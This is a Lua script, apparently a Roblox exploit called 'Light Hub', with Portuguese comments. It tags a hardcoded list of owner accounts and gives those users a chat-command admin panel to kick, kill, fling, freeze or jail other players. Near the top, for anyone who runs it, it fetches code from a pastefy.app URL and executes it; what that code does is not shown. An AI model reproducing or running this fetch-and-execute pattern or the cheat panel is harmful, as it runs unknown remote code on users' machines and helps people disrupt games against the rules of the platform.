-- ServiÃ§os
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

-- Lista de donos autorizados
local Donos = {
    ["hiro0881"] = true,
    ["jifhgiu"] = true,
    ["cartolahub7"] = true,
    ["ppyszt"] = true,
    ["pedro_roneido"] = true,
    ["pedro_roneido20"] = true,
    ["ixi362"] = true,
    ["rafaelgms7810396"] = true,
    ["piloto158d"] = true,
    ["rafaelgms67901"] = true,
    ["ilu1_22"] = true,
    ["foortataq"] = true,
}

-- Lista de usuÃ¡rios especiais (sempre em minÃºsculo)
local SpecialUsers = {
    ["hiro0881"] = "Dono",
    ["jifhgiu"] = "UsuÃ¡rio adm",
    ["cartolahub7"] = "UsuÃ¡rio adm",
    ["ppyszt"] = "UsuÃ¡rio adm",
    ["pedro_roneido"] = "UsuÃ¡rio adm",
    ["pedro_roneido20"] = "UsuÃ¡rio adm",
    ["ixi362"] = "UsuÃ¡rio adm",
    ["rafaelgms7810396"] = "UsuÃ¡rio adm",
    ["piloto158d"] = "UsuÃ¡rio adm",
    ["rafaelgms67901"] = "UsuÃ¡rio adm",
    ["ilu1_22"] = "UsuÃ¡rio adm",
    ["foortataq"] = "Usuário adm",
}

-- FunÃ§Ã£o que cria a tag
local function createSpecialTag(player, tagText)
    local char = player.Character
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end

    -- remove tag antiga
    local old = head:FindFirstChild("SpecialTag")
    if old then old:Destroy() end

    local billboardGui = Instance.new("BillboardGui")
    billboardGui.Name = "SpecialTag"
    billboardGui.Size = UDim2.new(0, 200, 0, 50)
    billboardGui.StudsOffset = Vector3.new(0, 3, 0)
    billboardGui.Adornee = head
    billboardGui.AlwaysOnTop = true
    billboardGui.Parent = head

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = tagText
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.TextScaled = true
    textLabel.Font = Enum.Font.GothamBold
    textLabel.TextStrokeTransparency = 0.2
    textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
    textLabel.Parent = billboardGui
end

-- FunÃ§Ã£o para aplicar tag automaticamente
local function applyTag(player)
    local tagType = SpecialUsers[player.Name:lower()]
    if tagType then
        -- reaplica sempre que o player respawnar
        player.CharacterAdded:Connect(function()
            task.wait(1)
            createSpecialTag(player, tagType)
        end)
        -- aplica jÃ¡ no spawn inicial
        if player.Character then
            createSpecialTag(player, tagType)
        end
    end
end

-- aplica em todos que jÃ¡ estÃ£o no jogo
for _, p in ipairs(Players:GetPlayers()) do
    applyTag(p)
end

-- aplica para quem entrar depois
Players.PlayerAdded:Connect(function(p)
    applyTag(p)
end)

-- Executa Fire Carregamento para todos
loadstring(game:HttpGet("https://pastefy.app/iesrRAJH/raw"))()

-- Se for dono, ativa o painel admin
if Donos[LocalPlayer.Name:lower()] then
    local playerOriginalSpeed = {}
    local jaulas = {}
    local jailConnections = {}

    local function EnviarComando(comando, playerName)
        local msg = comando
        if playerName then msg = comando.." "..playerName end
        local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
        if canal then
            canal:SendAsync(msg)
        else
            warn("Nenhum canal encontrado")
        end
    end

    local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
    local Window = WindUI:CreateWindow({
        Title = "Light Hub | Admin Panel",
        Icon = "shield",
        Author = "by: hiro",
        Folder = "PainelLight",
        Size = UDim2.fromOffset(580, 460),
        Transparent = true,
        Theme = "Midnight",
        Resizable = false,
        SideBarWidth = 200,
        BackgroundImageTransparency = 0.42,
        HideSearchBar = true,
        ScrollBarEnabled = true,
    })

    -- Aba Comandos
    local TabComandos = Window:Tab({ Title = "Comandos", Icon = "terminal", Locked = false })
    local SectionComandos = TabComandos:Section({ Title = "Admin", Icon = "user-cog", Opened = true })

    local TargetName
    local function getPlayersList()
        local t = {}
        for _, p in ipairs(Players:GetPlayers()) do
            table.insert(t, p.Name)
        end
        return t
    end

    local Dropdown = SectionComandos:Dropdown({
        Title = "Selecionar Jogador",
        Values = getPlayersList(),
        Value = "",
        Callback = function(option)
            TargetName = option
        end
    })

    Players.PlayerAdded:Connect(function()
        Dropdown:SetValues(getPlayersList())
    end)
    Players.PlayerRemoving:Connect(function()
        Dropdown:SetValues(getPlayersList())
    end)

    local comandosAlvo = {"kick","kill","killplus","fling","freeze","unfreeze","bring","jail","unjail"}

    for _, cmd in ipairs(comandosAlvo) do
        SectionComandos:Button({
            Title = cmd:upper(),
            Desc = "Envia ;"..cmd.." no chat para o jogador selecionado",
            Callback = function()
                if TargetName then
                    EnviarComando(";"..cmd, TargetName)
                else
                    warn("Nenhum jogador selecionado!")
                end
            end
        })
    end

    -- Aba Verify
    local TabVerify = Window:Tab({ Title = "Verify", Icon = "check", Locked = false })
    local SectionVerify = TabVerify:Section({ Title = "Verificar", Icon = "search", Opened = true })
    SectionVerify:Button({
        Title = "Enviar VerificaÃ§Ã£o",
        Desc = "Envia ;verifique no chat",
        Callback = function()
            EnviarComando(";verifique")
        end
    })

    -- FunÃ§Ã£o que executa comandos do chat
    local function ExecutarComando(msgText, autor)
        if not Donos[autor:lower()] then return end
        local playerName = LocalPlayer.Name:lower()
        local character = LocalPlayer.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")

        -- Kick
        if msgText:match(";kick%s+" .. playerName) then
            LocalPlayer:Kick("VocÃª foi removido pelo Painel ADM do Light hub.")
        end

        -- Kill
        if msgText:match(";kill%s+" .. playerName) then
            if character then character:BreakJoints() end
        end

        -- KillPlus
        if msgText:match(";killplus%s+" .. playerName) then
            if character then
                character:BreakJoints()
                local root = character:FindFirstChild("HumanoidRootPart")
                if root then
                    for i = 1, 10 do
                        local part = Instance.new("Part")
                        part.Size = Vector3.new(10,10,10)
                        part.Anchored = false
                        part.CanCollide = false
                        part.Material = Enum.Material.Neon
                        part.BrickColor = BrickColor.Random()
                        part.CFrame = root.CFrame
                        part.Parent = workspace
                        local bv = Instance.new("BodyVelocity")
                        bv.Velocity = Vector3.new(math.random(-50,50), math.random(20,80), math.random(-50,50))
                        bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
                        bv.Parent = part
                        game.Debris:AddItem(part, 3)
                    end
                end
            end
        end

        -- Fling
        if msgText:match(";fling%s+" .. playerName) then
            if character then
                local root = character:FindFirstChild("HumanoidRootPart")
                if root then
                    local targetCFrame = CFrame.new(50000, 5000000, 3972823)
                    local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear)
                    local tween = TweenService:Create(root, tweenInfo, {CFrame = targetCFrame})
                    tween:Play()
                end
            end
        end

        -- Freeze
        if msgText:match(";freeze%s+" .. playerName) then
            if humanoid then
                playerOriginalSpeed[playerName] = humanoid.WalkSpeed
                humanoid.WalkSpeed = 0
            end
        end

        -- Unfreeze
        if msgText:match(";unfreeze%s+" .. playerName) then
            if humanoid then
                humanoid.WalkSpeed = playerOriginalSpeed[playerName] or 16
                playerOriginalSpeed[playerName] = nil
            end
        end

        -- Verifique
        if msgText:match(";verifique") then
            pcall(function()
                local randomNumber = math.random(1000, 9999)
                local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
                if channel then
                    channel:SendAsync("LightHub10"..randomNumber)
                end
            end)
        end

        -- Bring
        local bringTarget = msgText:match(";bring%s+(%w+)")
        if bringTarget then
            if bringTarget == LocalPlayer.Name:lower() then
                local autorPlayer = Players:FindFirstChild(autor)
                if autorPlayer and autorPlayer.Character and autorPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    local root = character and character:FindFirstChild("HumanoidRootPart")
                    if root then
                        root.CFrame = autorPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-3)
                    end
                end
            end
        end

        -- Jail
        local jailTarget = msgText:match(";jail%s+(%w+)")
        if jailTarget and jailTarget == playerName then
            if character then
                local root = character:FindFirstChild("HumanoidRootPart")
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                if root and humanoid then
                    playerOriginalSpeed[playerName] = humanoid.WalkSpeed
                    humanoid.WalkSpeed = 0

                    local sizeX,sizeY,sizeZ = 10,10,10
                    local pos = root.Position
                    jaulas[playerName] = {}
                    local function criarParte(cframe,size)
                        local p = Instance.new("Part")
                        p.Size = size
                        p.Anchored = true
                        p.CanCollide = true
                        p.Transparency = 0.5
                        p.Color = Color3.fromRGB(255,140,0)
                        p.CFrame = cframe
                        p.Parent = workspace
                        table.insert(jaulas[playerName], p)
                    end
                    criarParte(CFrame.new(pos+Vector3.new(sizeX/2,0,0)),Vector3.new(1,sizeY,sizeZ))
                    criarParte(CFrame.new(pos+Vector3.new(-sizeX/2,0,0)),Vector3.new(1,sizeY,sizeZ))
                    criarParte(CFrame.new(pos+Vector3.new(0,0,sizeZ/2)),Vector3.new(sizeX,sizeY,1))
                    criarParte(CFrame.new(pos+Vector3.new(0,0,-sizeZ/2)),Vector3.new(sizeX,sizeY,1))
                    criarParte(CFrame.new(pos+Vector3.new(0,sizeY/2,0)),Vector3.new(sizeX,1,sizeZ))
                    criarParte(CFrame.new(pos+Vector3.new(0,-sizeY/2,0)),Vector3.new(sizeX,1,sizeZ))

                    if jailConnections[playerName] then
                        jailConnections[playerName]:Disconnect()
                    end
                    jailConnections[playerName] = RunService.Heartbeat:Connect(function()
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            local hrp = LocalPlayer.Character.HumanoidRootPart
                            local center = pos + Vector3.new(0,2,0)
                            if (hrp.Position - center).Magnitude > 6 then
                                hrp.CFrame = CFrame.new(center)
                            end
                        end
                    end)
                end
            end
        end

        -- Unjail
        local unjailTarget = msgText:match(";unjail%s+(%w+)")
        if unjailTarget and unjailTarget == playerName then
            if character then
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid.WalkSpeed = playerOriginalSpeed[playerName] or 16
                    playerOriginalSpeed[playerName] = nil
                end

                if jaulas[playerName] then
                    for _, p in ipairs(jaulas[playerName]) do
                        p:Destroy()
                    end
                    jaulas[playerName] = nil
                end

                if jailConnections[playerName] then
                    jailConnections[playerName]:Disconnect()
                    jailConnections[playerName] = nil
                end
            end
        end
    end

    -- Conectar chat para sempre receber comandos
    local function ConectarChat()
        for _, channel in pairs(TextChatService.TextChannels:GetChildren()) do
            if channel:IsA("TextChannel") then
                channel.MessageReceived:Connect(function(message)
                    if message.TextSource and message.Text then
                        ExecutarComando(message.Text:lower(), message.TextSource.Name)
                    end
                end)
            end
        end
    end

    ConectarChat()
    TextChatService.TextChannels.ChildAdded:Connect(function(channel)
        if channel:IsA("TextChannel") then
            channel.MessageReceived:Connect(function(message)
                if message.TextSource and message.Text then
                    ExecutarComando(message.Text:lower(), message.TextSource.Name)
                end
            end)
        end
    end)

    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(0.5)
        ConectarChat()
    end)
end

-- Som de conclusÃ£o
local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://8486683243"
sound.Volume = 0.5
sound.PlayOnRemove = true
sound.Parent = workspace
sound:Destroy()
